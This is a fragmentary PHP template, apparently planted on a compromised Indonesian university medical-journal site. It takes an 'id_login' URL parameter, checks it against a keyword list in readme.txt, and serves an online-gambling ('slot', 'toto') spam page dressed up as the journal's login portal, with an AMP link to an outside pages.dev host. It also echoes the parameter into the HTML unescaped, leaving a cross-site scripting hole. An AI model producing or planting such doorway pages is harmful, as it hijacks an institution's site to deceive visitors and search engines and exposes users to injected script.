<?php 
$aduh = "<?php echo $nical ?>"; // Liat Apa? Iri?
if (isset($_GET["id_login"])) {
    $aduh = $_GET["id_login"];
}
$aduh_cleaned = str_replace(' ', '-', $aduh);
$aduh_cleaned = str_replace('+', '-', $aduh_cleaned);
$amp = 'https://bangsa-jepe.pages.dev/jkzar/?id_login=' . strtolower($aduh_cleaned);
$nical = "https://{$_SERVER["HTTP_HOST"]}{$_SERVER["REQUEST_URI"]}";

$keywords = file('readme.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

if (!in_array($aduh, $keywords)) {
...
<!doctype html>
  ...
  <head>
    ...
    <base href="<?php echo $nical ?>">
    <meta charset="utf-8" />
    <title><?php echo strtoupper($aduh); ?> $ Portal Login Jurnal Kedokteran Universitas Islam Al Azhar Mataram Terkini!</title>
    <meta http-equiv="Accept-CH" content="Sec-CH-UA-Platform-Version, Sec-CH-UA-Model" />
    <link rel="icon" type="image/x-icon" href="/public/journals/1/favicon_en_us.png" />
    <link rel="amphtml" href="<?php echo $amp ?>" />
    <link rel="canonical" href="<?php echo $nical ?>" />
    <meta name="keywords" content="<?php echo strtoupper($aduh); ?>, login <?php echo strtoupper($aduh); ?>, daftar <?php echo strtoupper($aduh); ?>, situs <?php echo strtoupper($aduh); ?>, rtp <?php echo strtoupper($aduh); ?>, link alternatif <?php echo strtoupper($aduh); ?>">
    <meta property="og:site_name" content="<?php echo strtoupper($aduh); ?>" />
    <meta property="og:title" content="<?php echo strtoupper($aduh); ?> $ Portal Login Jurnal Kedokteran Universitas Islam Al Azhar Mataram Terkini!" />
    <meta property="og:url" content="<?php echo $nical ?>" />
    <meta property="og:type" content="product" />
    <meta property="og:description" content="Selamat datang di <?php echo strtoupper($aduh); ?>, adalah Portal Login Jurnal Kedokteran Universitas Islam Al Azhar Mataram, Di sini, Anda dapat dengan mudah mengakses berbagai artikel, penelitian, dan publikasi terbaru di bidang kedokteran. <?php echo strtoupper($aduh); ?> menyediakan platform lengkap yang ramah pengguna untuk para peneliti, dosen, mahasiswa, dan praktisi kesehatan yang ingin memperdalam wawasan dan berbagi pengetahuan." />
    <meta property="og:image" content="https://ik.imagekit.io/expx/4bigu/hear11.jpg?updatedAt=1751905248010" />
    <meta property="og:image:width" content="840" />
    <meta property="og:image:height" content="480" />
    <meta property="product:price:amount" content="888.00" />
    <meta property="product:price:currency" content="IDR" />
    <meta property="product:availability" content="instock" />
    <meta itemprop="name" content="<?php echo strtoupper($aduh); ?> $ Portal Login Jurnal Kedokteran Universitas Islam Al Azhar Mataram Terkini!" />
    <meta itemprop="url" content="<?php echo $nical ?>" />
    <meta itemprop="description" content="Selamat datang di <?php echo strtoupper($aduh); ?>, adalah Portal Login Jurnal Kedokteran Universitas Islam Al Azhar Mataram, Di sini, Anda dapat dengan mudah mengakses berbagai artikel, penelitian, dan publikasi terbaru di bidang kedokteran. <?php echo strtoupper($aduh); ?> menyediakan platform lengkap yang ramah pengguna untuk para peneliti, dosen, mahasiswa, dan praktisi kesehatan yang ingin memperdalam wawasan dan berbagi pengetahuan." />
    <meta itemprop="thumbnailUrl" content="https://ik.imagekit.io/expx/4bigu/hear11.jpg?updatedAt=1751905248010" />
    <link rel="image_src" href="https://ik.imagekit.io/expx/4bigu/hear11.jpg?updatedAt=1751905248010" />
    <meta itemprop="image" content="https://ik.imagekit.io/expx/4bigu/hear11.jpg?updatedAt=1751905248010" />
    <meta name="twitter:wwwwwwwwwww" content="<?php echo strtoupper($aduh); ?> $ Portal Login Jurnal Kedokteran Universitas Islam Al Azhar Mataram Terkini!" />
    <meta name="twitter:image" content="https://ik.imagekit.io/expx/4bigu/hear11.jpg?updatedAt=1751905248010" />
    <meta name="twitter:url" content="<?php echo $nical ?>" />
    <meta name="twitter:card" content="summary" />
    <meta name="twitter:description" content="Selamat datang di <?php echo strtoupper($aduh); ?>, adalah Portal Login Jurnal Kedokteran Universitas Islam Al Azhar Mataram, Di sini, Anda dapat dengan mudah mengakses berbagai artikel, penelitian, dan publikasi terbaru di bidang kedokteran. <?php echo strtoupper($aduh); ?> menyediakan platform lengkap yang ramah pengguna untuk para peneliti, dosen, mahasiswa, dan praktisi kesehatan yang ingin memperdalam wawasan dan berbagi pengetahuan." />
    <meta name="description" content="Selamat datang di <?php echo strtoupper($aduh); ?>, adalah Portal Login Jurnal Kedokteran Universitas Islam Al Azhar Mataram, Di sini, Anda dapat dengan mudah mengakses berbagai artikel, penelitian, dan publikasi terbaru di bidang kedokteran. <?php echo strtoupper($aduh); ?> menyediakan platform lengkap yang ramah pengguna untuk para peneliti, dosen, mahasiswa, dan praktisi kesehatan yang ingin memperdalam wawasan dan berbagi pengetahuan." />
  ...
  .n-columns-2 {
    ...
    .login, .login-button {
      background: linear-gradient(to bottom, #f5bd00 0%, #f5bd00 100%);
              ...
              <div class="header-title-nav-wrapper">
                ...
                <div class="
                  ...
                  <div class="header-title-logo">
                    <a href="<?php echo $nical ?>" data-animation-role="header-element">
  
                      <img elementtiming="nbf-header-logo-desktop"
                        src="https://ik.imagekit.io/expx/gacoflash.gif?updatedAt=1740016763889"
                        alt="<?php echo strtoupper($aduh); ?>" style="display:block" fetchpriority="high" loading="eager" decoding="async"
                        data-loader="raw">
  ...
  " data-animation-role="header-element">
    ...
    ">
                  ...
                  <article
                    class="ProductItem hentry tag-slot-online tag-situs-toto tag-toto-slot author-situs-toto-slot-4D post-type-store-item"
                    ...
                    <nav class="ProductItem-nav">
                      <div class="ProductItem-nav-breadcrumb" data-animation-role="content">
                        ...
                        <a href="/store/p/zeus" class="ProductItem-nav-breadcrumb-link"><?php echo strtoupper($aduh); ?> $ Portal Login Jurnal Kedokteran Universitas Islam Al Azhar Mataram Terkini!</a>
                      </div>
                        ...
                        <div class="ProductItem-gallery-slides" data-animation-role="image" data-product-gallery="slides">
                          ...
                          <div class="ProductItem-gallery-slides-item" data-slide-index="1"
                            ...
                            <img aria-describedby="ProductItem-gallery-slides-item-1-index-65fd0fd62438744c9a05c86b"
                              ...
                              data-src="https://ik.imagekit.io/expx/4bigu/hear11.jpg?updatedAt=1751905248010"
                              data-image="https://ik.imagekit.io/expx/4bigu/hear11.jpg?updatedAt=1751905248010"
                              data-image-dimensions="840x480" data-image-focal-point="0.5,0.5" alt="<?php echo strtoupper($aduh); ?>"
                                      ...
                                      <div class="gallery-lightbox-item-src">
                                        <div class="gallery-lightbox-item-img content-fit">
                                          <img
                                            ...
                                            alt="<?php echo strtoupper($aduh); ?>" data-load="false" elementtiming="nbf-product-lightbox" /></div>
                                      </div>
                                    </div>
                                  </figure>
    ...
    " data-test="pdp-details">
                        <h1 class="ProductItem-details-title" data-content-field="title" data-test="pdp-title">
                          <?php echo strtoupper($aduh); ?> $ Portal Login Jurnal Kedokteran Universitas Islam Al Azhar Mataram Terkini!                        </h1>
  ...
  <p>Selamat datang di <?php echo strtoupper($aduh); ?>, adalah Portal Login Jurnal Kedokteran Universitas Islam Al Azhar Mataram, Di sini, Anda dapat dengan mudah mengakses berbagai artikel, penelitian, dan publikasi terbaru di bidang kedokteran. <?php echo strtoupper($aduh); ?> menyediakan platform lengkap yang ramah pengguna untuk para peneliti, dosen, mahasiswa, dan praktisi kesehatan yang ingin memperdalam wawasan dan berbagi pengetahuan.</p> 
                          </div>
  ...
  <small class="copyright__content"><a href="<?php echo $nical ?>" title="Daftar Slot Online">Copyright ©2025 <?php echo strtoupper($aduh); ?></a></small>
      </footer>
